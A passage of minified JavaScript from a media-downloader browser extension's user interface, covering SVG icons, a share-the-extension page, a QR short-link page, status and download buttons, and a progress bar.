                { xmlns: "http://www.w3.org/2000/svg", width: "25.8px", height: "33px", viewBox: "0 0 25.8 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 25.35 8.65 L 25.35 8.05 Q 25.35 0 17.35 0 L 8.5 0 Q 0.45 0 0.45 8.05 L 0.45 8.65 Q 0.45 11.45 1.45 13.25 2.45 15.05 4.3 15.9 2.2 16.55 1.1 18.4 0 20.25 0 23.35 L 0 25 Q 0 33 8 33 L 17.8 33 Q 25.8 33 25.8 25 L 25.8 23.35 Q 25.8 20.25 24.7 18.4 23.6 16.55 21.5 15.9 23.4 15.05 24.35 13.25 25.35 11.45 25.35 8.65 M 20.7 8.3 L 20.7 10.45 Q 20.7 12.25 19.95 13.1 19.25 13.95 17.5 14.05 L 8.3 14.05 Q 6.6 13.95 5.85 13.1 5.1 12.25 5.1 10.45 L 5.1 8.3 Q 5.1 6.4 5.9 5.5 6.75 4.65 8.6 4.65 L 17.2 4.65 Q 19.05 4.65 19.9 5.5 20.7 6.4 20.7 8.3 M 20.35 19.5 Q 21.2 20.35 21.2 22.2 L 21.2 24.75 Q 21.2 26.65 20.35 27.5 19.55 28.4 17.65 28.4 L 8.15 28.4 Q 6.25 28.4 5.45 27.5 4.6 26.65 4.6 24.75 L 4.6 22.2 Q 4.6 20.35 5.45 19.5 6.25 18.65 8.15 18.65 L 17.65 18.65 Q 19.55 18.65 20.35 19.5 Z",
                })
            );
        var num_9 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "24.45px", height: "33px", viewBox: "0 0 24.45 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 23.1 1.4 Q 22.45 0.8 21.6 0.4 20.75 0 19.75 0 L 4.7 0 Q 3.75 0 2.9 0.4 2 0.8 1.35 1.4 0.7 2.05 0.35 2.9 0 3.75 0 4.75 L 0 14.15 Q 0 15.15 0.35 16 0.7 16.85 1.35 17.5 2 18.1 2.9 18.5 3.75 18.9 4.7 18.9 L 19.75 18.9 19.75 28.3 4.7 28.3 4.7 24.05 0 24.05 0 28.3 Q 0 29.25 0.35 30.15 0.7 31 1.35 31.6 2 32.25 2.9 32.65 3.75 33 4.7 33 L 19.75 33 Q 20.75 33 21.6 32.65 22.45 32.25 23.1 31.6 23.75 31 24.1 30.15 24.45 29.25 24.45 28.3 L 24.45 4.75 Q 24.45 3.75 24.1 2.9 23.75 2.05 23.1 1.4 M 19.75 14.15 L 4.7 14.15 4.7 4.75 19.75 4.75 19.75 14.15 Z",
                })
            );
        const social_media_sharing_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "social-media-sharing__Container",
                componentId: "sc-y4bloo-0",
            })`display:flex;flex-direction:row;justify-content:space-between;margin:6px 16px 26px;color:${(props) => props.color};& + button{display:flex;margin:0 auto 24px;}& b{color:${(props) => props.numColor}}`,
            Counter = styled_components_browser_esm.a.div.withConfig({ displayName: "social-media-sharing__Counter", componentId: "sc-y4bloo-1" })`border:1px solid ${(props) =>
                props.figureBorder};border-radius:4px;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;width:80px;height:80px;margin:10px;&::before,&::after{border:2px solid ${(props) =>
                props.figureColor};content:" ";display:block;position:absolute;width:70px;height:70px;}&::before{background-color:${(props) => props.figureColor};transform:rotate(45deg);}&::after{border-radius:2px}& svg{fill:${(props) =>
                props.figureNumColor}}`,
            IconOverContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "social-media-sharing__IconOverContainer", componentId: "sc-y4bloo-2" })`display:flex;align-items:flex-end;position:relative;z-index:1;`,
            NumberContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "social-media-sharing__NumberContainer", componentId: "sc-y4bloo-3" })`display:flex;justify-content:center;transform:${(props) =>
                `scale(${props.scale})`};& svg{margin:0 3px}`,
            social_media_sharing_Conlumn = styled_components_browser_esm.a.div.withConfig({ displayName: "social-media-sharing__Conlumn", componentId: "sc-y4bloo-4" })`display:flex;flex-direction:column;align-items:flex-end;`,
            social_media_sharing_Paragraph = styled_components_browser_esm.a.p.withConfig({ displayName: "social-media-sharing__Paragraph", componentId: "sc-y4bloo-5" })`font-size:14px;width:310px;margin-bottom:12px;`,
            ButtonCancel = styled_components_browser_esm.a.button.withConfig({
                displayName: "social-media-sharing__ButtonCancel",
                componentId: "sc-y4bloo-6",
            })`outline:none;border:none;padding:0;margin:0 auto 24px;display:block;cursor:pointer;font-size:16px;background-color:transparent;color:${(props) => props.color};&:hover{color:${(props) => props.hover};}`,
            IconOver = () => {
                const { t: t } = useTranslation();
                return react_default.a.createElement(IconOverContainer, null, "ru" === t("lang") ? react_default.a.createElement(over_ru, null) : react_default.a.createElement(over_en, null));
            },
            social_media_sharing_Number = ({ num: num }) => {
                const str = (num > 999 ? 999 : num).toString();
                return react_default.a.createElement(
                    NumberContainer,
                    { scale: num > 99 ? 0.6 : 1 },
                    [...str].reduce((result, item) => {
                        switch (item) {
                            case "1":
                                result.push(react_default.a.createElement(num_1, { key: result }));
                                break;
                            case "2":
                                result.push(react_default.a.createElement(num_2, { key: result }));
                                break;
                            case "3":
                                result.push(react_default.a.createElement(num_3, { key: result }));
                                break;
                            case "4":
                                result.push(react_default.a.createElement(num_4, { key: result }));
                                break;
                            case "5":
                                result.push(react_default.a.createElement(num_5, { key: result }));
                                break;
                            case "6":
                                result.push(react_default.a.createElement(num_6, { key: result }));
                                break;
                            case "7":
                                result.push(react_default.a.createElement(num_7, { key: result }));
                                break;
                            case "8":
                                result.push(react_default.a.createElement(num_8, { key: result }));
                                break;
                            case "9":
                                result.push(react_default.a.createElement(num_9, { key: result }));
                                break;
                            default:
                                result.push(react_default.a.createElement(num_0, { key: result }));
                        }
                        return result;
                    }, [])
                );
            };
        var social_media_sharing = () => {
                const { theme: theme, sendEvent: sendEvent, downloadsCount: downloadsCount } = use_app_state(["theme", "sendEvent", "downloadsCount"]),
                    { t: t } = useTranslation(),
                    history = useHistory(),
                    socialMediaSharing = theme && theme.social_media_sharing,
                    color = (socialMediaSharing && socialMediaSharing.color) || "gray",
                    numColor = (socialMediaSharing && socialMediaSharing.num_color) || "gray",
                    figureColor = (socialMediaSharing && socialMediaSharing.figure) || "black",
                    figureBorder = (socialMediaSharing && socialMediaSharing.figure_border) || "black",
                    figureNumColor = (socialMediaSharing && socialMediaSharing.figure_num_color) || "black",
                    buttonCancel = socialMediaSharing && socialMediaSharing.button_cancel,
                    buttonCancelColor = (buttonCancel && buttonCancel.color) || "gray",
                    buttonCancelHover = (buttonCancel && buttonCancel.hover) || "black",
                    { extensionName: extensionName, socialMediaSharingUrl: socialMediaSharingUrl } = config.a,
                    already = t("social_media_sharing.already", { context: 1 === downloadsCount ? "oneMediafile" : "moreThanOneMediafile" });
                return react_default.a.createElement(
                    page,
                    { title: t("social_media_sharing.title") },
                    react_default.a.createElement(
                        social_media_sharing_Container,
                        { color: color, numColor: numColor },
                        react_default.a.createElement(
                            Counter,
                            { figureColor: figureColor, figureBorder: figureBorder, figureNumColor: figureNumColor },
                            downloadsCount > 999 && react_default.a.createElement(IconOver, null),
                            react_default.a.createElement(social_media_sharing_Number, { num: downloadsCount })
                        ),
                        react_default.a.createElement(
                            social_media_sharing_Conlumn,
                            null,
                            react_default.a.createElement(
                                Trans,
                                { i18nKey: "social_media_sharing.message", count: downloadsCount, values: { downloadsCount: downloadsCount, extensionName: extensionName, already: already } },
                                react_default.a.createElement(
                                    social_media_sharing_Paragraph,
                                    null,
                                    "With our browser extension you have ",
                                    already,
                                    " downloaded ",
                                    react_default.a.createElement("span", null, react_default.a.createElement("b", null, downloadsCount)),
                                    t("social_media_sharing.mediafile"),
                                    " :)"
                                ),
                                react_default.a.createElement(social_media_sharing_Paragraph, null, "To keep ", extensionName, " free we need your help - tell about us on social networks or messengers!")
                            )
                        )
                    ),
                    react_default.a.createElement(ui_button, {
                        onClick: () => {
                            sendEvent({ action: "share_btn" }), socialMediaSharingUrl && window.open(socialMediaSharingUrl, "_blank");
                        },
                        icon: share,
                        text: t("social_media_sharing.button_ok"),
                    }),
                    react_default.a.createElement(ButtonCancel, { color: buttonCancelColor, hover: buttonCancelHover, onClick: () => history.go(-1) }, t("social_media_sharing.button_cancel"))
                );
            },
            dist = __webpack_require__(146),
            lib = __webpack_require__(147),
            lib_default = __webpack_require__.n(lib);
        const spinAnimation = styled_components_browser_esm.b`from{transform:rotate(0deg);}to{transform:rotate(360deg);}`,
            Svg = styled_components_browser_esm.a.svg.withConfig({
                displayName: "spinner__Svg",
                componentId: "sc-58vu1y-0",
            })`margin:auto;max-height:calc(100% - 6px);animation-name:${spinAnimation};animation-duration:0.9s;animation-timing-function:linear;animation-iteration-count:infinite;`;
        var spinner = ({ color: color }) => {
            const { theme: theme } = use_app_state(["theme"]),
                themeSpinner = (theme && theme.spinner) || "#3498db";
            return react_default.a.createElement(
                Svg,
                { xmlns: "http://www.w3.org/2000/svg", width: "24px", height: "24px", viewBox: "0 0 24 24" },
                react_default.a.createElement("path", {
                    fill: color || themeSpinner,
                    d: " M 12 0 Q 7.05 0 3.5 3.45 L 5.6 5.55 Q 8.26796875 3 12 3 15.7 3 18.3 5.6 18.337890625 5.6373046875 18.35 5.65 L 20.5 3.5 Q 20.4876953125 3.4876953125 20.45 3.45 16.95 0 12 0 Z",
                })
            );
        };
        var warning_2 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "45.9px", height: "40px", viewBox: "0 0 45.9 40", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 24.2 29.85 Q 23.7 29.3 22.95 29.3 22.2 29.3 21.7 29.85 21.15 30.35 21.15 31.1 21.15 31.85 21.7 32.35 22.2 32.9 22.95 32.9 23.7 32.9 24.2 32.35 24.75 31.85 24.75 31.1 24.75 30.35 24.2 29.85 M 24.2 10.4 Q 23.7 9.85 22.95 9.85 22.2 9.85 21.7 10.4 21.15 10.9 21.15 11.65 L 21.15 24.85 Q 21.15 25.55 21.7 26.1 22.2 26.6 22.95 26.6 23.7 26.6 24.2 26.1 24.75 25.55 24.75 24.85 L 24.75 11.65 Q 24.75 10.9 24.2 10.4 M 40.95 23.45 Q 41.1 22.75 40.75 22.1 L 29.25 3.55 Q 28.25 1.9 26.55 0.95 24.9 0 22.95 0 21 0 19.3 0.95 17.65 1.9 16.65 3.55 L 1.1 28.65 Q 0.05 30.4 0 32.4 -0.05 34.4 0.95 36.15 1.95 37.95 3.65 38.95 5.4 40 7.45 40 L 38.45 40 Q 40.3 40 41.95 39.15 43.55 38.3 44.6 36.7 45.65 35.2 45.85 33.35 46.05 31.5 45.35 29.8 45.1 29.1 44.4 28.85 43.75 28.55 43.05 28.8 42.35 29.1 42.05 29.75 41.75 30.45 42.05 31.15 42.4 32 42.3 32.95 42.15 33.9 41.65 34.7 41.1 35.5 40.25 35.95 39.4 36.4 38.45 36.4 L 7.45 36.4 Q 6.4 36.4 5.5 35.85 4.6 35.35 4.1 34.4 3.55 33.5 3.6 32.45 3.6 31.4 4.15 30.5 L 19.65 5.4 Q 20.2 4.55 21.05 4.1 21.95 3.6 22.95 3.6 23.95 3.6 24.8 4.1 25.7 4.55 26.2 5.4 L 37.7 24 Q 38.05 24.6 38.8 24.8 39.5 24.95 40.15 24.55 40.8 24.2 40.95 23.45 Z",
                })
            );
        const qr_code_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "qr-code__Container",
                componentId: "sc-5lkwtp-0",
            })`display:flex;justify-content:flex-end;margin:16px 0 24px;& div{margin-bottom:24px;}& p{width:280px;}& canvas{border:16px solid white;display:block;margin:0 auto;}`,
            qr_code_Paragraph = styled_components_browser_esm.a.p.withConfig({ displayName: "qr-code__Paragraph", componentId: "sc-5lkwtp-1" })`font-size:14px;line-height:20px;color:${(props) => props.color};margin:0 16px 24px;`,
            QRcodeContent = ({ t: t, theme: theme, data: data }) => {
                const themeQrCode = theme && theme.qr_code,
                    errorColor = themeQrCode && themeQrCode.error;
                return null === data.err
                    ? react_default.a.createElement(lib_default.a, { size: 256, value: data.url, bgColor: "white", fgColor: "black" })
                    : react_default.a.createElement(
                          react_default.a.Fragment,
                          null,
                          react_default.a.createElement(warning_2, { color: errorColor }),
                          react_default.a.createElement(qr_code_Paragraph, { color: errorColor }, t("qr_code_error"))
                      );
            };
        var pages_qr_code = ({ url: url }) => {
            const { t: t } = useTranslation(),
                { theme: theme } = use_app_state(["theme"]),
                themeQrCode = theme && theme.qr_code,
                color = themeQrCode && themeQrCode.color,
                { isFetching: isFetching, data: data } = Object(dist.useCache)(
                    () =>
                        (async function (url) {
                            try {
                                const { findOrCreateUrl: findOrCreateUrl, shortUrl: shortUrl } = config.a,
                                    res = await fetch(findOrCreateUrl, {
                                        method: "POST",
                                        mode: "cors",
                                        headers: { "Content-Type": "application/json" },
                                        redirect: "follow",
                                        referrerPolicy: "no-referrer",
                                        body: JSON.stringify({ webpage_url: url }),
                                    });
                                if (200 === res.status) {
                                    const bundle = await res.json();
                                    return { url: shortUrl.replace(/{%bundleIncrement%}/g, bundle.increment), err: null };
                                }
                                return { url: null, err: res.statusText };
                            } catch (e) {
                                return { url: null, err: e };
                            }
                        })(url),
                    url
                );
            return react_default.a.createElement(
                page,
                { title: t("qr_code_title") },
                react_default.a.createElement(qr_code_Container, null, isFetching ? react_default.a.createElement(spinner, null) : react_default.a.createElement(QRcodeContent, { t: t, theme: theme, data: data })),
                react_default.a.createElement(qr_code_Paragraph, { color: color }, t("qr_code_description"))
            );
        };
        var app_body = () =>
                react_default.a.createElement(
                    react_router_Switch,
                    null,
                    react_default.a.createElement(react_router_Route, { exact: !0, path: "/", render: () => react_default.a.createElement(main, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/more", render: () => react_default.a.createElement(main, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/settings", render: () => react_default.a.createElement(settings, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/help", render: () => react_default.a.createElement(pages_help, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/confirm", render: () => react_default.a.createElement(pages_confirm, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/social-media-sharing", render: () => react_default.a.createElement(social_media_sharing, null) }),
                    react_default.a.createElement(react_router_Route, { path: "/qrcode/:data", render: ({ match: match }) => react_default.a.createElement(pages_qr_code, { url: decodeURIComponent(match.params.data) }) })
                ),
            app_styled_button = styled_components_browser_esm.a.button.withConfig({ displayName: "styled-button", componentId: "sc-n1c59b-0" })`outline:none;flex:1;display:flex;align-items:center;justify-content:center;cursor:${(props) =>
                !1 === props.enabled ? "default" : "pointer"};${(props) => {
                if (props.download) {
                    const result = `\n        padding: 0 9px;\n        border: 1px solid ${props.border};\n      `;
                    if ("ltr" === props.dir) return `\n          ${result}\n          border-right: none;\n          border-top-left-radius: 2px;\n          border-bottom-left-radius: 2px;\n        `;
                    if ("rtl" === props.dir) return `\n          ${result}\n          border-left: none;\n          border-top-right-radius: 2px;\n          border-bottom-right-radius: 2px;\n        `;
                }
                if (props.dropdown) {
                    const result = `\n        padding: 0;\n        border: 1px solid ${props.border};\n      `;
                    if ("ltr" === props.dir) return `\n          ${result}\n          border-left: none;\n          border-top-right-radius: 2px;\n          border-bottom-right-radius: 2px;\n        `;
                    if ("rtl" === props.dir) return `\n          ${result}\n          border-right: none;\n          border-top-left-radius: 2px;\n          border-bottom-left-radius: 2px;\n        `;
                }
                return "\n      padding: 0 6px;\n      border: none;\n      border-radius: 2px;\n    ";
            }} ${(props) =>
                !1 === props.enabled
                    ? "background-color: rgba(128,128,128,0.65);"
                    : props.dropdown
                    ? "\n        background-color: #fff6e5;\n        &:hover {\n          background-color: #fff3dd;\n          & span {\n            color: #282828;\n            &::after {\n              border-right-color: #282828;\n              border-bottom-color: #282828;\n            }\n          }\n        }\n      "
                    : props.download
                    ? "\n        background-color: #ffa200;\n        &:hover { background-color: #ff982a }\n        &:active { background-color: #ff8400}\n      "
                    : "\n      background-color: #ffa200;\n      &:active { background-color: #ff8400 }\n    "} & .iconDownload{max-height:calc(100% - 10px);margin:0 4px;fill:white;}& span{color:${(props) =>
                props.dropdown ? "#5e5e5e" : "white"};${(props) =>
                props.dropdown &&
                '\n      display: flex;\n      padding: 0 6px;\n      &::before {\n        content: " ";\n        width: 4px;\n      }\n      &::after {\n        content: " ";\n        width: 9px;\n        height: 9px;\n        margin: 0 4px;\n        transform: rotate(45deg) scale(0.7);\n        border-right: 2px solid #5e5e5e;\n        border-bottom: 2px solid #5e5e5e;\n      }\n    '}}`,
            styled_text = styled_components_browser_esm.a.span.withConfig({ displayName: "styled-text", componentId: "sc-5h7nhe-0" })`user-select:none;margin:0 4px;`,
            unavailable = ({ isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode, openLandingUrl: openLandingUrl }) => {
                const { defaultItem: defaultItem, dir: dir, publicIds: publicIds } = use_app_state(["defaultItem", "dir", "publicIds"]),
                    { t: t } = useTranslation(),
                    { webPortalName: webPortalName } = config.a,
                    { btnTextId: btnTextId } = publicIds;
                return react_default.a.createElement(
                    error_boundary,
                    null,
                    react_default.a.createElement(
                        react_router_MemoryRouter,
                        null,
                        isSplit &&
                            react_default.a.createElement(
                                app_styled_button,
                                {
                                    download: "true",
                                    dir: dir,
                                    border: "#d5d0d0",
                                    ref: (node) => {
                                        node && setSplitDownloadButtonNode(node);
                                    },
                                },
                                react_default.a.createElement(icons_download, { className: "iconDownload" })
                            ),
                        react_default.a.createElement(
                            ui_dropdown,
                            { overlay: react_default.a.createElement(app_body, null), trigger: isSplit ? "click" : "hover" },
                            isSplit
                                ? react_default.a.createElement(app_styled_button, { dropdown: "true", dir: dir, border: "#d5d0d0" }, react_default.a.createElement(styled_text, { id: btnTextId }, webPortalName))
                                : react_default.a.createElement(
                                      app_styled_button,
                                      {
                                          onClick: () => {
                                              openLandingUrl();
                                          },
                                      },
                                      react_default.a.createElement(icons_download, { className: "iconDownload" }),
                                      react_default.a.createElement(styled_text, { id: btnTextId }, "" + t("download").toUpperCase(), " ", react_default.a.createElement(ExtTitle, { item: defaultItem }))
                                  )
                        )
                    )
                );
            };
        var normal_protected = () => {
            const { t: t } = useTranslation(),
                { publicIds: publicIds } = use_app_state(["publicIds"]),
                { btnTextId: btnTextId } = publicIds;
            return react_default.a.createElement(
                ui_tooltip,
                { title: t("protected_tooltip") },
                react_default.a.createElement(
                    app_styled_button,
                    { enabled: !1 },
                    react_default.a.createElement(extension_logo, { className: "iconDownload" }),
                    react_default.a.createElement(styled_text, { id: btnTextId }, t("protected").toUpperCase())
                )
            );
        };
        var premiere = () => {
            const { t: t } = useTranslation(),
                { publicIds: publicIds } = use_app_state(["publicIds"]),
                { btnTextId: btnTextId } = publicIds;
            return react_default.a.createElement(
                ui_tooltip,
                { title: t("premiere_tooltip") },
                react_default.a.createElement(
                    app_styled_button,
                    { enabled: !1 },
                    react_default.a.createElement(extension_logo, { className: "iconDownload" }),
                    react_default.a.createElement(styled_text, { id: btnTextId }, t("premiere").toUpperCase())
                )
            );
        };
        var live_stream = () => {
            const { t: t } = useTranslation(),
                { publicIds: publicIds } = use_app_state(["publicIds"]),
                { btnTextId: btnTextId } = publicIds;
            return react_default.a.createElement(
                ui_tooltip,
                { title: t("live_stream_tooltip") },
                react_default.a.createElement(
                    app_styled_button,
                    { enabled: !1 },
                    react_default.a.createElement(extension_logo, { className: "iconDownload" }),
                    react_default.a.createElement(styled_text, { id: btnTextId }, t("live_stream").toUpperCase())
                )
            );
        };
        var icons_cancel = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "14px", height: "14px", viewBox: "0 0 14 14", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M7,0C3.2,0,0,3.1,0,7s3.2,7,7,7s7-3.2,7-7S10.9,0,7,0z M10.5,9.3c0.3, 0.3,0.3,0.8,0,1.2c-0.3,0.3-0.8,0.3-1.2,0L7,8.1l-2.3,2.3c-0.3,0.3-0.8, 0.3-1.2,0c-0.3-0.3-0.3-0.8,0-1.2L5.8,7L3.5,4.7c-0.3-0.3-0.3-0.8, 0-1.2c0.3-0.3,0.8-0.3,1.2,0L7,5.8l2.3-2.3c0.3-0.3,0.8-0.3,1.2,0c0.3, 0.3,0.3,0.8,0,1.2L8.2,7L10.5,9.3z",
                })
            );
        const CompoundContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "progress-bar__CompoundContainer", componentId: "sc-1wjjgs9-0" })`display:flex;flex-direction:column;align-items:center;align-self:center;`,
            progress_bar_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "progress-bar__Container",
                componentId: "sc-1wjjgs9-1",
            })`display:flex !important;flex-direction:row !important;align-items:center !important;`,
            Progress = styled_components_browser_esm.a.div.withConfig({ displayName: "progress-bar__Progress", componentId: "sc-1wjjgs9-2" })`background-color:${(props) =>
                props.background || "black"};width:85px;height:8px;border-radius:6px;position:relative;overflow:hidden;${(props) => props.borderColor && `border: 1px solid ${props.borderColor};`}`,
            Indicator = styled_components_browser_esm.a.div.withConfig({ displayName: "progress-bar__Indicator", componentId: "sc-1wjjgs9-3" })`background-color:${(props) =>
                props.progressColor};position:absolute;height:8px;border-radius:4px;`,
            Cancel = styled_components_browser_esm.a.button.withConfig({
                displayName: "progress-bar__Cancel",
                componentId: "sc-1wjjgs9-4",
            })`background-color:transparent;outline:none;border:none;padding:0;cursor:pointer;display:flex;&::before{content:" ";width:6px;}`;
        var progress_bar = ({ color: color }) => {
                const { progress: progress, cancel: cancel, theme: theme, listMode: listMode, setListMode: setListMode, contentLength: contentLength, alreadyDownloaded: alreadyDownloaded } = use_app_state([
                        "progress",
                        "cancel",
                        "theme",
                        "listMode",
                        "setListMode",
                        "contentLength",
                        "alreadyDownloaded",
                    ]),
                    { t: t } = useTranslation(),
                    [clicked, setClicked] = Object(react.useState)(0),
                    onClick = (evt) => {
                        evt && (evt.preventDefault(), evt.stopPropagation()), console.log("cancel called", cancel), setClicked(0), cancel && cancel();
                    },
                    progressBarStyles = theme && theme.progress_bar,
                    background = progressBarStyles && progressBarStyles.background,
                    progressColor = progressBarStyles && progressBarStyles.progress,
                    cancelColor = progressBarStyles && progressBarStyles.cancel;
                return (
                    Object(react.useEffect)(() => {
                        "short" !== listMode && setListMode("short");
                    }, [listMode, setListMode]),
                    react_default.a.createElement(
                        CompoundContainer,
                        null,
                        react_default.a.createElement(
                            progress_bar_Container,
                            null,
                            react_default.a.createElement(
                                ui_tooltip,
                                { title: `${human_readable_content_length(alreadyDownloaded)} / ${human_readable_content_length(contentLength)}` },
                                react_default.a.createElement(
                                    Progress,
                                    { background: color ? "transparent" : background, borderColor: color },
                                    react_default.a.createElement(Indicator, { progressColor: color || progressColor, style: { width: (progress || 0) + "%" } })
                                )
                            ),
                            react_default.a.createElement(
                                ui_tooltip,
                                { title: t("cancel_download") },
                                react_default.a.createElement(
                                    Cancel,
                                    {
                                        onClick: onClick,
                                        onMouseDown: () => {
                                            console.log("ON MOUSE DOWN!!!"), setClicked(Date.now());
                                        },
                                        onMouseUp: () => {
                                            console.log("On mOUSE UP"), Date.now() - clicked < 200 && onClick();
                                        },
                                    },
                                    react_default.a.createElement(icons_cancel, { color: color || cancelColor })
                                )
                            )
                        )
                    )
                );
            },
            getting_info = ({ color: color }) => react_default.a.createElement(spinner, { color: color });
        var get_default_status = (mediaInfo) =>
            ((mediaInfo) => {
                const { video: video, streams: streams, audio: audio, imgs: imgs } = mediaInfo;
                return (!video || !video.length) && (!streams || !streams.length) && (!audio || !audio.length) && !(!imgs || !imgs.length);
            })(mediaInfo)
                ? "imgDownloading"
                : ((mediaInfo) => {
                      const { isLiveStream: liveStream } = mediaInfo;
                      return !(
                          "true" !== liveStream &&
                          !0 !== liveStream &&
                          ("object" != typeof liveStream || !liveStream.liveStreamabilityRenderer || ("displayEndscreen" in liveStream.liveStreamabilityRenderer && !1 !== liveStream.liveStreamabilityRenderer.displayEndscreen))
                      );
                  })(mediaInfo)
                ? "liveStream"
                : ((mediaInfo) => {
                      const { isPremiere: premiere } = mediaInfo;
                      return !!premiere;
                  })(mediaInfo)
                ? "premiere"
                : ((mediaInfo) => {
                      const { streams: streams, video: video } = mediaInfo;
                      return (streams && streams.length) || (video && video.length);
                  })(mediaInfo)
                ? "idle"
                : "unavailable";
        var semicircles = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "23.8px", height: "22px", viewBox: "0 0 23.8 22", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M0.5,17.5C0.2,17.5,0,17.3,0,17c0.1-0.4,0.1-0.7,0.2-1.1c0.1-0.2,0.3-0.5,0.5-0.5c0.5,0.1,1.1,0.2,1.6,0.2 c-1-2-1.3-4.5-0.9-6.6c0.4-2,1.4-4.1,2.8-5.6s3.4-2.6,5.5-3.1c2.6-0.5,5.5-0.2,7.6,1.3c0.2,0.1,0.4,0.2,0.5,0.4 c0.2,0.2,0.2,0.5,0,0.5c-0.2,0.3-0.4,0.5-0.5,0.8c-0.1,0.2-0.3,0.2-0.5,0.2c-0.2-0.1-0.2-0.2-0.4-0.2c-1.4-0.8-3-1.4-4.6-1.3 c-2,0.1-3.9,0.8-5.5,2.1c-1.6,1.4-2.6,3.4-3,5.5c-0.4,2.4,0.2,4.8,1.5,6.6C5,16.3,5.1,16.6,5.1,17c0,0.5-0.3,0.8-0.7,0.9 c-0.2,0.1-0.5,0.1-0.5,0C2.7,17.8,1.5,17.6,0.5,17.5z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M5.9,19.9c-0.1-0.3,0.2-0.5,0.3-0.6c0.2-0.2,0.3-0.5,0.5-0.6c0.2-0.2,0.5-0.2,0.6,0c1.5,1,3.4,1.5,5.1,1.4 c2-0.2,3.9-1,5.4-2.4c1.5-1.4,2.5-3.3,2.7-5.2c0.5-2.4-0.2-4.8-1.5-6.7c-0.2-0.2-0.4-0.5-0.3-0.8c0.1-0.5,0.5-0.9,1.1-0.8 c1.2,0.1,2.4,0.3,3.5,0.5c0.2,0,0.5,0.3,0.5,0.5c-0.1,0.4-0.1,0.7-0.2,1.1c-0.1,0.3-0.3,0.5-0.5,0.5c-0.5-0.2-1.1-0.2-1.5-0.3 c1.4,2.8,1.4,6.3,0.2,9.1c-0.8,1.8-2,3.5-3.6,4.6c-1.6,1.2-3.5,1.9-5.6,2c-2.1,0.1-4.2-0.5-6-1.6C6.2,20.3,6,20.2,5.9,19.9z",
                })
            );
        const download_error_DownloadErrorContainer = styled_components_browser_esm.a.div.withConfig({
            displayName: "download-error__DownloadErrorContainer",
            componentId: "sc-ggnyaf-0",
        })`display:flex;align-items:center;position:relative;margin:${(props) =>
            "ltr" === props.dir ? "0 0 0 2px" : "0 2px 0 0"};height:22px;max-height:calc(100% - 6px);& svg{fill:white;max-height:100%;}& .iconExtensionLogo{position:absolute;left:50%;transform:scale(0.63) translateX(-65%);}`;
        var download_error = () => {
            const { dir: dir, setStatus: setStatus, info: info, setIsPreviousDownloading: setIsPreviousDownloading, publicIds: publicIds } = use_app_state(["dir", "setStatus", "info", "setIsPreviousDownloading", "publicIds"]),
                { t: t } = useTranslation(),
                { btnTextId: btnTextId } = publicIds;
            return react_default.a.createElement(
                error_boundary,
                null,
                react_default.a.createElement(
                    react_router_MemoryRouter,
                    null,
                    react_default.a.createElement(
                        ui_dropdown,
                        { overlay: react_default.a.createElement(app_body, null), trigger: "hover" },
                        react_default.a.createElement(
                            app_styled_button,
                            {
                                onClick: () => {
                                    setIsPreviousDownloading(!1), setStatus(get_default_status(info));
                                },
                            },
                            react_default.a.createElement(
                                download_error_DownloadErrorContainer,
                                { dir: dir },
                                react_default.a.createElement(semicircles, null),
                                react_default.a.createElement(extension_logo, { className: "iconExtensionLogo" })
                            ),
                            react_default.a.createElement(styled_text, { id: btnTextId }, t("reset").toUpperCase())
                        )
                    )
                )
            );
        };
        const SplittedDownloadButton = ({ openLandingUrl: openLandingUrl, dropdownNode: dropdownNode }) => {
                const { status: status, defaultItem: defaultItem, warnBeforeConverting: warnBeforeConverting, download: download, dir: dir } = use_app_state(["status", "defaultItem", "warnBeforeConverting", "download", "dir"]),
                    history = useHistory(),
                    [nodeRef, setNodeRef] = Object(react.useState)();
                return (
                    use_event_listener(nodeRef, "click", (e) => {
                        e.preventDefault(),
                            "unavailable" === status || "error" === status || (defaultItem && defaultItem.availableInDesktopClient)
                                ? openLandingUrl()
                                : defaultItem && (defaultItem.conversionRequired && warnBeforeConverting ? ("/confirm" !== history.location.pathname && history.push("/confirm"), dropdownNode && dropdownNode.click()) : download());
                    }),
                    react_default.a.createElement(app_styled_button, { download: "true", dir: dir, border: "#d5d0d0", ref: setNodeRef }, react_default.a.createElement(icons_download, { className: "iconDownload" }))
                );
            },
            DownloadButton = ({ openLandingUrl: openLandingUrl }) => {
                const { status: status, defaultItem: defaultItem, warnBeforeConverting: warnBeforeConverting, download: download, publicIds: publicIds } = use_app_state([
                        "status",
                        "defaultItem",
                        "warnBeforeConverting",
                        "download",
                        "publicIds",
                    ]),
                    history = useHistory(),
                    { t: t } = useTranslation(),
                    [nodeRef, setNodeRef] = Object(react.useState)(),
                    { btnTextId: btnTextId } = publicIds;
                return (
                    use_event_listener(nodeRef, "click", () => {
                        "unavailable" === status || "error" === status || (defaultItem && defaultItem.availableInDesktopClient)
                            ? openLandingUrl()
